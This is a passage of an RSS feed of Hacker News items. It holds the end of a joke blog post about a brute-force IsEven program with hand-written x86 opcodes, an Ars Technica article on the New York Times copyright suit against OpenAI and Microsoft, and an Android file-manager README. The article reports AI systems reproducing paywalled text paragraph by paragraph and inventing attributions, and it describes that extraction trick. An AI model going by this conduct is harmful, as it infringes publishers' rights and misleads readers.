<p>Beautiful! Our algorithm seems to scale with the data! The executable is around 2 MB, but that’s no match for my beefy gaming rig with a whopping 31.8 GB of memory.</p>

<p>Now, 16 bit is a very cool bitwidth, but as we all know, 32 bit is the holy grail of computing and is the final bitwidth that we need to solve all practical engineering and scientific problems. After all, IPv4 is still standing stronger than ever, 60 years after it was deemed deprecated due to so called <a href="https://en.wikipedia.org/wiki/IPv4_address_exhaustion">“address exhaustion”</a>.</p>

<p>So without further ado, lets scale to our final size. 32 bit is only 65536 times as many numbers as 16 bit, what could go wrong?</p>

<figure><pre><code data-lang="python"><span>print</span><span>(</span><span>"    uint32_t number = atoi(argv[1]); // No problems here"</span><span>)</span>
<span>…</span>
<span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>2</span><span>**</span><span>32</span><span>):</span></code></pre></figure>

<p>So I let the mighty snake do its work and after getting a cup of coffee and getting back to check on the program 48 hours later I was left with a beautiful c file, almost 330 GB in size! Almost certainly among the largest c files in history. My fingers were trembling when I entered the next command, surely MSVC had never before encountered such powerful source code. After abusing the pagefile of my poor, powerful computer for half an hour the following was spat out:</p>

<figure><pre><code data-lang="powershell"><span>PS</span><span> </span><span>&gt;</span><span> </span><span>cl</span><span> </span><span>/Od</span><span> </span><span>program.c</span><span>
</span><span>Microsoft</span><span> </span><span>(</span><span>R</span><span>)</span><span> </span><span>C/C</span><span>++</span><span> </span><span>Optimizing</span><span> </span><span>Compiler</span><span> </span><span>Version</span><span> </span><span>19.32.31329</span><span> </span><span>for</span><span> </span><span>x64</span><span>
</span><span>Copyright</span><span> </span><span>(</span><span>C</span><span>)</span><span> </span><span>Microsoft</span><span> </span><span>Corporation.</span><span>  </span><span>All</span><span> </span><span>rights</span><span> </span><span>reserved.</span><span>

</span><span>program.c</span><span>
</span><span>program.c</span><span>(</span><span>134397076</span><span>):</span><span> </span><span>warning</span><span> </span><span>C4049:</span><span> </span><span>compiler</span><span> </span><span>limit:</span><span> </span><span>terminating</span><span> </span><span>line</span><span> </span><span>number</span><span> </span><span>emission</span><span>
</span><span>program.c</span><span>(</span><span>134397076</span><span>):</span><span> </span><span>note:</span><span> </span><span>Compiler</span><span> </span><span>limit</span><span> </span><span>for</span><span> </span><span>line</span><span> </span><span>number</span><span> </span><span>is</span><span> </span><span>16777215</span><span>
</span><span>program.c</span><span>(</span><span>41133672</span><span>):</span><span> </span><span>fatal</span><span> </span><span>error</span><span> </span><span>C1060:</span><span> </span><span>compiler</span><span> </span><span>is</span><span> </span><span>out</span><span> </span><span>of</span><span> </span><span>heap</span><span> </span><span>space</span></code></pre></figure>

<p>Pathetic!</p>

<p>And not only did the compiler fail us, but when looking into the limits of the Portable Executable format (.exe) for windows, I discovered that it cannot handle more than a <a href="https://stackoverflow.com/questions/6976693/what-is-the-maximum-size-of-a-pe-file-on-64-bit-windows">measly 4 GB</a>! With more than 4 billion comparisons needed to be encoded into the executable, this is a major obstacle for implementing our algorithm. Even if each comparison would use less than a single byte we would still be too heavy.</p>

<p>However, bad compilers and file formats should not stop us from achieving our dream. After all, all what a compiler does is writing some fancy machine code into a file and the file format is just some structure telling the OS how to put the binary code into memory. Really, we can do that ourselves.</p>

<p>Let’s start by writing an IsEven function in <a href="https://en.wikipedia.org/wiki/X86_assembly_language">x86-64 assembly</a> as it’s the native language of my Intel powered machine. It looks something like this:</p>

<figure><pre><code data-lang="assembly">; Argument is stored in ECX, return value in EAX
XOR EAX, EAX ; Set eax to zero (return value for odd number)
CMP ECX, 0h ; Compare arg to 0 
JNE 3h ; Skip next two instructions if it wasn't equal
INC EAX ; It was even, set even return value (1)
RET ; Return
CMP ECX, 1h ; Compare arg to 1
JNE 2 ; Skip next instruction if not equal
RET ; Odd return value already in EAX, just RET
; add the next 2...2^32-1 comparisons here
RET ; Fallback return</code></pre></figure>

<p>Not really correct asm, but it doesn’t matter much, because we’re gonna compile it into machine code manually.</p>

<p>How did I do this? Well I jumped online, using a mix of my early life experience coding emulators and hacking and looked into the x86(-64) architecture manuals to figure out the correct opcodes and format for each instruction.</p>

<p>… Just kidding, that’s horrible. I asked ChatGPT what the correct <a href="https://en.wikipedia.org/wiki/Opcode">opcode</a> was for each instruction and lucky for us it didn’t hallucinate any new extensions to x86-64.</p>

<p>So now we just write a “compiler” to output this code. Note that we will write the opcodes we got from the AI for the instructions directly. Here’s how it looks in our friend python:</p>

<figure><pre><code data-lang="python"><span>import</span> <span>struct</span>

<span>with</span> <span>open</span><span>(</span><span>'isEven.bin'</span><span>,</span> <span>'wb'</span><span>)</span> <span>as</span> <span>file</span><span>:</span>
   
    <span>file</span><span>.</span><span>write</span><span>(</span><span>b</span><span>"</span><span>\x31\xC0</span><span>"</span><span>)</span>                     <span># XOR EAX, EAX
</span>
    <span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>2</span><span>**</span><span>32</span><span>):</span>
        <span>ib</span> <span>=</span> <span>struct</span><span>.</span><span>pack</span><span>(</span><span>"&lt;I"</span><span>,</span> <span>i</span><span>)</span>               <span># Encode i as 32 bit little endian integer
</span>
        <span>file</span><span>.</span><span>write</span><span>(</span><span>b</span><span>"</span><span>\x81\xF9</span><span>"</span> <span>+</span> <span>ib</span><span>)</span>            <span># CMP ECX, i
</span>
        <span>if</span> <span>i</span><span>%</span><span>2</span> <span>==</span> <span>0</span><span>:</span>
            <span>file</span><span>.</span><span>write</span><span>(</span><span>b</span><span>"</span><span>\x75\x03</span><span>"</span><span>)</span>             <span># JNE +3
</span>            <span>file</span><span>.</span><span>write</span><span>(</span><span>b</span><span>"</span><span>\xFF\xC0</span><span>"</span><span>)</span>             <span># INC EAX
</span>            <span>file</span><span>.</span><span>write</span><span>(</span><span>b</span><span>"</span><span>\xC3</span><span>"</span><span>)</span>                 <span># RET
</span>        <span>else</span><span>:</span>
            <span>file</span><span>.</span><span>write</span><span>(</span><span>b</span><span>"</span><span>\x75\x01</span><span>"</span><span>)</span>             <span># JNE +1
</span>            <span>file</span><span>.</span><span>write</span><span>(</span><span>b</span><span>"</span><span>\xC3</span><span>"</span><span>)</span>                 <span># RET
</span>
    <span>file</span><span>.</span><span>write</span><span>(</span><span>b</span><span>"</span><span>\xC3</span><span>"</span><span>)</span>                         <span># Fallback RET</span></code></pre></figure>

<p>While we somewhat deviated from the original vision of the TikTok post, the essence remains the same. We create a long, long, long list of if-statements to determine if any number is even or odd, ignoring any arithmetic operation that would help out.</p>

<p>Running this gives us a nice 40 GB file which contains all 4.2 billion comparisons needed to determine if any 32 bit number is even or odd! Now we just need to write our host program that can load and use these instructions. For added performance (it is very important), I decided to map the file into the address space instead of reading all of it. By doing this, we can just pretend that the entire file is already in memory and let the poor OS deal with fitting a 40 GB blob into virtual memory. After mapping the file with READ and EXECUTE permissions we can call into the code by using a function pointer. It looks like this:</p>

<figure><pre><code data-lang="c"><span>#include &lt;stdio.h&gt;
#include &lt;Windows.h&gt;
#include &lt;stdint.h&gt;
</span>
<span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span><span>*</span> <span>argv</span><span>[])</span>
<span>{</span>
    <span>uint32_t</span> <span>number</span> <span>=</span> <span>atoi</span><span>(</span><span>argv</span><span>[</span><span>1</span><span>]);</span> <span>// No problems here</span>

    <span>// Open code file</span>
    <span>HANDLE</span> <span>binFile</span> <span>=</span> <span>CreateFileA</span><span>(</span>
                        <span>"isEven.bin"</span><span>,</span>
                        <span>GENERIC_READ</span> <span>|</span> <span>GENERIC_EXECUTE</span><span>,</span> <span>FILE_SHARE_READ</span><span>,</span>
                        <span>NULL</span><span>,</span>
                        <span>OPEN_EXISTING</span><span>,</span>
                        <span>FILE_ATTRIBUTE_NORMAL</span><span>,</span>
                        <span>NULL</span><span>);</span>
   
    <span>// Get 64 bit size of file</span>
    <span>LARGE_INTEGER</span> <span>codeSize</span><span>;</span>
    <span>GetFileSizeEx</span><span>(</span><span>binFile</span><span>,</span> <span>&amp;</span><span>codeSize</span><span>);</span>

    <span>// Create memory map of the file</span>
    <span>HANDLE</span> <span>mapping</span> <span>=</span> <span>CreateFileMapping</span><span>(</span>
                        <span>binFile</span><span>,</span>
                        <span>NULL</span><span>,</span>
                        <span>PAGE_EXECUTE_READ</span><span>,</span>
                        <span>0</span><span>,</span>
                        <span>0</span><span>,</span>
                        <span>NULL</span><span>);</span>

    <span>// Get a pointer to the code</span>
    <span>LPVOID</span> <span>code</span> <span>=</span> <span>MapViewOfFile</span><span>(</span>
                    <span>mapping</span><span>,</span><span>FILE_MAP_EXECUTE</span> <span>|</span> <span>FILE_MAP_READ</span><span>,</span>
                    <span>0</span><span>,</span>
                    <span>0</span><span>,</span>
                    <span>codeSize</span><span>.</span><span>QuadPart</span><span>);</span>

    <span>// Create a function that points to the code</span>
    <span>int</span> <span>(</span><span>*</span><span>isEven</span><span>)(</span><span>int</span><span>)</span> <span>=</span> <span>(</span><span>int</span><span>(</span><span>*</span><span>)(</span><span>int</span><span>))</span><span>code</span><span>;</span>

    <span>if</span> <span>(</span><span>isEven</span><span>(</span><span>number</span><span>))</span>
        <span>printf</span><span>(</span><span>"even</span><span>\n</span><span>"</span><span>);</span>
    <span>else</span>
        <span>printf</span><span>(</span><span>"odd</span><span>\n</span><span>"</span><span>);</span>

    <span>CloseHandle</span><span>(</span><span>binFile</span><span>);</span>
<span>}</span></code></pre></figure>

<p>And there we go! We now have everything to check if any 32 bit number is even or odd. Let’s take it for a spin:</p>

<figure><pre><code data-lang="powershell"><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>300</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>0</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>1000000</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>100000007</span><span>
</span><span>odd</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>400000000</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>400000001</span><span>
</span><span>odd</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>400000006</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>4200000000</span><span>
</span><span>odd</span><span> </span><span>&lt;</span><span>----</span><span> </span><span>WRONG</span><span>!</span></code></pre></figure>

<p>Almost! Seems like the algorithm has some issues with signedness, any value over 2^31 seems to give random results. Sad!</p>

<p>Let’s fix the final bug.</p>

<p>It turns out that atoi cannot deal with unsigned pureness, so it failed to parse our big boy numbers. Replacing it with strtoul fixes everything.</p>

<figure><pre><code data-lang="c"><span>uint32_t</span> <span>number</span> <span>=</span> <span>strtoul</span><span>(</span><span>argv</span><span>[</span><span>1</span><span>],</span> <span>NULL</span><span>,</span> <span>10</span><span>);</span><span>// No problems here</span></code></pre></figure>

<figure><pre><code data-lang="powershell"><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>4200000000</span><span>
</span><span>even</span><span>
</span><span>PS</span><span> </span><span>&gt;</span><span>.</span><span>\program.exe</span><span> </span><span>4200000001</span><span>
</span><span>odd</span></code></pre></figure>

<p>As a side note, the program is amazingly performant. For small numbers the results are instantaneous and for the large number close to the 2^32 limit the result is still returned in around 10 seconds. Considering the computer has to read 40 GB of data from disk, map it to physical memory and then let the CPU has a rip of it without many chances of caching is honestly quite mind blowing. For reference, the computer is a Core i5 12600K with 32 GB memory and the files are residing on a M.2 SSD disk. While calculating, the peak read speed I saw from the SSD was around 800 MB/s (which doesn’t really make sense as that should give execution speeds at 40+ seconds, but computers are magical so who knows what is going on).</p>

<p>And there we have it! The Internet proven wrong once again, not only can you actually write a fully functioning and performant program in the manner of the TikTok post, but it’s also very fun.</p>

  </div>
</article>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[NY Times copyright suit wants OpenAI to delete all GPT instances (310 pts)]]></title>
            <link>https://arstechnica.com/tech-policy/2023/12/ny-times-sues-open-ai-microsoft-over-copyright-infringement/</link>
            <guid>38790255</guid>
            <pubDate>Thu, 28 Dec 2023 05:07:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/tech-policy/2023/12/ny-times-sues-open-ai-microsoft-over-copyright-infringement/">https://arstechnica.com/tech-policy/2023/12/ny-times-sues-open-ai-microsoft-over-copyright-infringement/</a>, See on <a href="https://news.ycombinator.com/item?id=38790255">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <h4>
      Not the sincerest form of flattery    —
</h4>
            <h2 itemprop="headline">NY Times copyright suit wants OpenAI to delete all GPT instances</h2>
            <h2 itemprop="description">Shows evidence that GPT-based systems will reproduce Times articles if asked.</h2>
                    </div><div itemprop="articleBody">
                                    
<figure>
  <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/12/GettyImages-1621976654-800x450.jpg" alt="Image of a CPU on a motherboard with " ai="" stamped="" on="" it="">
      <figcaption><p><a href="https://cdn.arstechnica.net/wp-content/uploads/2023/12/GettyImages-1621976654.jpg" data-height="1299" data-width="2309">Enlarge</a> <span>/</span> Microsoft is named in the suit for allegedly building the system that allowed GPT derivatives to be trained using infringing material.</p></figcaption>  </figure>

  




<!-- cache hit 339:single/related:c68a8bff5724c49da7e49cf4e16a54d5 --><!-- empty -->
<p>In August, <a href="https://arstechnica.com/tech-policy/2023/08/report-potential-nyt-lawsuit-could-force-openai-to-wipe-chatgpt-and-start-over/">word leaked out</a> that The New York Times was considering joining the growing legion of creators that are suing AI companies for misappropriating their content. The Times had reportedly been negotiating with OpenAI regarding the potential to license its material, but those talks had not gone smoothly. So, eight months after the company was reportedly considering suing, <a href="https://nytco-assets.nytimes.com/2023/12/NYT_Complaint_Dec2023.pdf">the suit has now been filed</a>.</p>
<p>The Times is targeting various companies under the OpenAI umbrella, as well as Microsoft, an OpenAI partner that both uses it to power its Copilot service and helped provide the infrastructure for training the GPT Large Language Model. But the suit goes well beyond the use of copyrighted material in training, alleging that OpenAI-powered software will happily circumvent the Times' paywall and ascribe hallucinated misinformation to the Times.</p>
<h2>Journalism is expensive</h2>
<p>The suit notes that The Times maintains a large staff that allows it to do things like dedicate reporters to a huge range of beats and engage in important investigative journalism, among other things. Because of those investments, the newspaper is often considered an authoritative source on many matters.</p>
<p>All of that costs money, and The Times earns that by limiting access to its reporting through a robust paywall. In addition, each print edition has a copyright notification, the Times' terms of service limit the copying and use of any published material, and it can be selective about how it licenses its stories. In addition to driving revenue, these restrictions also help it to maintain its reputation as an authoritative voice by controlling how its works appear.</p>
<p>The suit alleges that OpenAI-developed tools undermine all of that. "By providing Times content without The Times’s permission or authorization, Defendants’ tools undermine and damage The Times’s relationship with its readers and deprive The Times of subscription, licensing, advertising, and affiliate revenue," the suit alleges.</p>
<p>Part of the unauthorized use The Times alleges came during the training of various versions of GPT. Prior to GPT-3.5, information about the training dataset was made public. One of the sources used is a large collection of online material called "Common Crawl," which the suit alleges contains information from 16 million unique records from sites published by The Times. That places the Times as the third most referenced source, behind Wikipedia and a database of US patents.</p>                                            
                                                        
<p>OpenAI no longer discloses as many details of the data used for training of recent GPT versions, but all indications are that full-text NY Times articles are still part of that process (Much more on that in a moment.) Expect access to training information to be a major issue during discovery if this case moves forward.</p>
<h2>Not just training</h2>
<p>A <a href="https://arstechnica.com/tech-policy/2023/10/two-artists-suing-ai-image-makers-never-copyrighted-their-works/">number of suits</a> have <a href="https://arstechnica.com/tech-policy/2023/10/universal-music-sues-ai-start-up-anthropic-for-scraping-song-lyrics/">been filed</a> regarding the <a href="https://arstechnica.com/information-technology/2023/07/book-authors-sue-openai-and-meta-over-text-used-to-train-ai/">use of copyrighted material</a> during <a href="https://arstechnica.com/tech-policy/2023/09/george-r-r-martin-joins-authors-suing-openai-over-copyright-infringement/">training of AI systems</a>. But the Times' suit goes well beyond that to show how the material ingested during training can come back out during use. "Defendants’ GenAI tools can generate output that recites Times content verbatim, closely summarizes it, and mimics its expressive style, as demonstrated by scores of examples," the suit alleges.</p>
<p>The suit alleges—and we were able to verify—that it's comically easy to get GPT-powered systems to offer up content that is normally protected by the Times' paywall. The suit shows a number of examples of GPT-4 reproducing large sections of articles nearly verbatim.</p>
<p>The suit includes screenshots of ChatGPT being given the title of a piece at The New York Times and asked for the first paragraph, which it delivers. Getting the ensuing text is apparently as simple as repeatedly asking for the next paragraph.</p>
<p>ChatGPT has apparently closed that loophole in between the preparation of that suit and the present. We entered some of the prompts shown in the suit, and were advised "I recommend checking The New York Times website or other reputable sources," although we can't rule out that context provided prior to that prompt could produce copyrighted material.</p>
<figure><img alt="Ask for a paragraph, and Copilot will hand you a wall of normally paywalled text." src="https://cdn.arstechnica.net/wp-content/uploads/2023/12/Screen-Shot-2023-12-27-at-12.11.54-PM.png" width="934" height="799"><figcaption><p>Ask for a paragraph, and Copilot will hand you a wall of normally paywalled text.</p><p>John Timmer</p></figcaption></figure>
<p>But not all loopholes have been closed. The suit also shows output from Bing Chat, since rebranded as Copilot. We were able to verify that asking for the first paragraph of a specific article at The Times caused Copilot to reproduce the first third of the article.</p>                                            
                                                        
<p>The suit is dismissive of attempts to justify this as a form of fair use. "Publicly, Defendants insist that their conduct is protected as 'fair use' because their unlicensed use of copyrighted content to train GenAI models serves a new 'transformative' purpose," the suit notes. "But there is nothing 'transformative' about using The Times’s content without payment to create products that substitute for The Times and steal audiences away from it."</p>
<h2>Reputational and other damages</h2>
<p>The hallucinations common to AI also came under fire in the suit for potentially damaging the value of the Times' reputation, and possibly damaging human health as a side effect. "A GPT model completely fabricated that “The New York Times published an article on January 10, 2020, titled ‘Study Finds Possible Link between Orange Juice and Non-Hodgkin’s Lymphoma,’” the suit alleges. "The Times never published such an article."</p>
<p>Similarly, asking about a Times article on heart-healthy foods allegedly resulted in Copilot saying it contained a list of examples (which it didn't). When asked for the list, 80 percent of the foods on weren't even mentioned by the original article. In another case, recommendations were ascribed to the Wirecutter when the products hadn't even been reviewed by its staff.</p>
<p>As with the Times material, it's alleged that it's possible to get Copilot to offer up large chunks of Wirecutter articles (The Wirecutter is owned by The New York Times). But the suit notes that these article excerpts have the affiliate links stripped out of them, keeping the Wirecutter from its primary source of revenue.</p>
<p>The suit targets various OpenAI companies for developing the software, as well as Microsoft—the latter for both offering OpenAI-powered services, and for having developed the computing systems that enabled the copyrighted material to be ingested during training. Allegations include direct, contributory, and vicarious copyright infringement, as well as DMCA and trademark violations. Finally, it alleges "Common Law Unfair Competition By Misappropriation."</p>
<p>The suit seeks nothing less than the erasure of both any GPT instances that the parties have trained using material from the Times, as well as the destruction of the datasets that were used for the training. It also asks for a permanent injunction to prevent similar conduct in the future. The Times also wants money, lots and lots of money: "statutory damages, compensatory damages, restitution, disgorgement, and any other relief that may be permitted by law or equity."</p>

                                                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Little File Explorer – File Manager for Android 1.0 and above (130 pts)]]></title>
            <link>https://github.com/martinmimigames/little-file-explorer</link>
            <guid>38789958</guid>
            <pubDate>Thu, 28 Dec 2023 04:11:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/martinmimigames/little-file-explorer">https://github.com/martinmimigames/little-file-explorer</a>, See on <a href="https://news.ycombinator.com/item?id=38789958">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">Little File Explorer</h2>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/martinmimigames/little-file-explorer/blob/main/docs/images/icon.png"><img src="https://github.com/martinmimigames/little-file-explorer/raw/main/docs/images/icon.png" alt="Icon"></a></p>
<p dir="auto"><a href="https://github.com/martinmimigames/little-file-explorer/blob/main/LICENSE.md"><img src="https://camo.githubusercontent.com/e7bb4e4d68df6fd055e495ae65d3a0fa1b7766c0b49e1e6b7cd638847a13924d/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c6963656e73652f6d617274696e6d696d6967616d65732f6c6974746c652d66696c652d6578706c6f7265723f7374796c653d666c61742d737175617265" alt="Read License" data-canonical-src="https://img.shields.io/github/license/martinmimigames/little-file-explorer?style=flat-square"></a></p>
<p dir="auto"><a href="https://www.codefactor.io/repository/github/martinmimigames/little-file-explorer" rel="nofollow"><img src="https://camo.githubusercontent.com/b1831516e31dabea2627d22b5afb1189e7cf37b31ab87ebbd75b5d5fa1db7956/68747470733a2f2f696d672e736869656c64732e696f2f636f6465666163746f722f67726164652f6769746875622f6d617274696e6d696d6967616d65732f6c6974746c652d66696c652d6578706c6f7265722f6d61696e3f7374796c653d666c61742d737175617265" alt="Code Quality" data-canonical-src="https://img.shields.io/codefactor/grade/github/martinmimigames/little-file-explorer/main?style=flat-square"></a></p>
<h2 tabindex="-1" dir="auto">Descriptions</h2>
<p dir="auto">A small, simple file explorer, designed with compatibility in mind.</p>
<p dir="auto">Open-sourced and publicly-viewable code for anyone worrying about being locked in or privacy invasion.</p>
<p dir="auto">It provides multiple functions, including copy and pasting files, multi-file share, etc. More information available in <strong>Features</strong> section below.</p>
<p dir="auto">Supports Android 1.0+</p>
<p dir="auto">Currently under 40 KB.</p>
<p dir="auto">Previous known as <em>Simple File Explorer</em> (but from martinmimigames).</p>
<p dir="auto">Location of website:
<a href="https://martinmimigames.github.io/projects/little-file-explorer/index.html" rel="nofollow">https://martinmimigames.github.io/projects/little-file-explorer</a>.</p>
<h2 tabindex="-1" dir="auto">Screenshots</h2>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/martinmimigames/little-file-explorer/blob/main/docs/images/example1.jpg"><img src="https://github.com/martinmimigames/little-file-explorer/raw/main/docs/images/example1.jpg" alt="Screenshot 1"></a></p>
<h2 tabindex="-1" dir="auto">Features</h2>
<ul dir="auto">
<li>Free</li>
<li>Small (&lt; 40 KB)</li>
<li>Basic file operations (Cut, copy, paste, rename, delete)</li>
<li>File name filter</li>
<li>Name and Modified Time sort</li>
<li>Easy switch between sdcard and internal storage</li>
<li>Multi-share function</li>
<li>File/folder path copying</li>
<li>Minimum permissions</li>
<li>Dark/light theme toggle</li>
<li>md5 checksum generation and verification</li>
</ul>
<h2 tabindex="-1" dir="auto">Latest Versions</h2>
<ul dir="auto">
<li>
<p dir="auto">v4.14</p>
<ul dir="auto">
<li>Fixed filter bug causing crash on startup</li>
<li>Fixed file not opening on some apps (missing metadata)</li>
<li>Fixed file size calculation incorrect</li>
<li>Now clear text input when create new folder</li>
<li>More natural-looking back button</li>
<li>Removed unused notification about invalid folder name</li>
<li>Now uses Future for concurrency management (less race condition)</li>
</ul>
</li>
<li>
<p dir="auto">v4.13</p>
<ul dir="auto">
<li>Fixed # in file name error</li>
<li>Added follow system dark mode</li>
<li>Fixed crash when open details of large files</li>
<li>Fixed error when empty clipboard</li>
<li>Now clear filter when entering/exiting folder</li>
<li>Added invalid name warning when creating/renaming files</li>
</ul>
</li>
<li>
<p dir="auto">v4.12</p>
<ul dir="auto">
<li>added md5 checksum calculation and verification (details page)</li>
<li>theme is now toggle-based (burger menu)</li>
<li>app now forget last path (feature reverted)</li>
</ul>
</li>
<li>
<p dir="auto">v4.11</p>
<ul dir="auto">
<li>Fix crashing if last exited on a non-existing folder</li>
<li>Fix unable to exit folders with access denied</li>
<li>Added details page for files</li>
<li>Added light mode (follows system settings)</li>
<li>Added sorting by file size</li>
<li>Moved storage info to the bottom</li>
<li>Added slight padding to dialogs</li>
</ul>
</li>
<li>
<p dir="auto">v4.10</p>
<ul dir="auto">
<li>Added "toggle hidden" option (available in menu button)</li>
<li>Added File/Folder name filtering (available on top bar)</li>
<li>Added display sorting (name, last modified time) (available in menu button)</li>
<li>Added file path remembering on app exit</li>
<li>Re-added share button in open list options</li>
<li>Fixed delete confirmation screen being full screen</li>
</ul>
</li>
<li>
<p dir="auto">v4.9</p>
<ul dir="auto">
<li>Fixed sticky selection state after leaving app</li>
<li>Fixed concurrent directory list modification</li>
<li>Removed share button from file option menu</li>
<li>Added duplicate folder warning when creating new folder</li>
<li>Changed rounding system for storage size display</li>
<li>Always update storage list quick switch display</li>
<li>Now use cache thread pool for reducing idle cpu usage and increase performance</li>
</ul>
</li>
<li>
<p dir="auto">v4.8</p>
<ul dir="auto">
<li>Allow folder path to be copied to clipboard</li>
<li>Fixed incorrect handling after path copying</li>
<li>Fixed delete conformation button being pushed out by long list</li>
<li>Fixed copying to incorrect directory when moved directory while in progress</li>
</ul>
</li>
<li>
<p dir="auto">v4.7</p>
<ul dir="auto">
<li>Added multi-share option (sdk 4+)</li>
<li>Added file path copy option</li>
<li>Allow open file with default apps</li>
<li>Reduced open list button size</li>
<li>Capitalised buttons</li>
<li>Changed opener text</li>
</ul>
</li>
<li>
<p dir="auto">v4.6</p>
<ul dir="auto">
<li>Fixed not opening when no sdcard inserted</li>
</ul>
</li>
<li>
<p dir="auto">v4.5</p>
<ul dir="auto">
<li>smaller apk</li>
<li>fixed quick selection overlap with menu list</li>
<li>opening file request by other app now have open prompt</li>
<li>changed audio png</li>
<li>back button now go back to parent folder if available</li>
</ul>
</li>
</ul>
<h2 tabindex="-1" dir="auto">Branches</h2>
<ul dir="auto">
<li>main: latest source-code</li>
</ul>
<h2 tabindex="-1" dir="auto">Issues</h2>
<p dir="auto">Issues and pull requests are always welcome!</p>
<p dir="auto">You can submit issues the following ways:</p>
<ul dir="auto">
<li>via <a href="https://github.com/martinmimigames/little-file-explorer/issues">Github Issues</a></li>
<li>via email: <a href="mailto:martinmimigames@gmail.com">martinmimigames@gmail.com</a></li>
</ul>
<h2 tabindex="-1" dir="auto">Installation</h2>
<p dir="auto"><a href="https://f-droid.org/packages/com.martinmimigames.simplefileexplorer/" rel="nofollow"><img src="https://camo.githubusercontent.com/6904720a6735bf9a5ff4296afbe06c9e4c0d2f55f88ffdabd6df340c87b2083d/68747470733a2f2f6d617274696e6d696d6967616d65732e6769746875622e696f2f7265732f6765742d69742d6f6e2f662d64726f69642e706e67" alt="Get it on F-Droid" height="80" data-canonical-src="https://martinmimigames.github.io/res/get-it-on/f-droid.png"></a></p>
<p dir="auto"><a href="https://github.com/martinmimigames/little-file-explorer/releases/latest"><img src="https://camo.githubusercontent.com/8d8788cbbd75d3ebaacf8084cfb1d5d29f5069434007a42b26a89bc9169b68a8/68747470733a2f2f6d617274696e6d696d6967616d65732e6769746875622e696f2f7265732f6765742d69742d6f6e2f6769746875622e706e67" alt="Get it on Github" height="80" data-canonical-src="https://martinmimigames.github.io/res/get-it-on/github.png"></a></p>
<p dir="auto"><a href="https://martinmimigames.github.io/projects/little-file-explorer" rel="nofollow">Get it from the official website</a></p>
<h2 tabindex="-1" dir="auto">Made by Martinmimigames</h2>
<p dir="auto">Official Website at <a href="https://martinmimigames.github.io/" rel="nofollow">https://martinmimigames.github.io</a></p>
<h3 tabindex="-1" dir="auto">Last update of README</h3>
<p dir="auto">Date : 28-11-2023 dd-mm-yyyy</p>
<h3 tabindex="-1" dir="auto">Important</h3>
<p dir="auto"><strong>Please read the license!</strong></p>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Generation Junk (293 pts)]]></title>
            <link>https://walterkirn.substack.com/p/generation-junk</link>
            <guid>38789411</guid>
            <pubDate>Thu, 28 Dec 2023 02:44:12 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://walterkirn.substack.com/p/generation-junk">https://walterkirn.substack.com/p/generation-junk</a>, See on <a href="https://news.ycombinator.com/item?id=38789411">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa8978450-3afd-4253-866b-fbd8507f8409_221x228.jpeg" width="221" height="228" 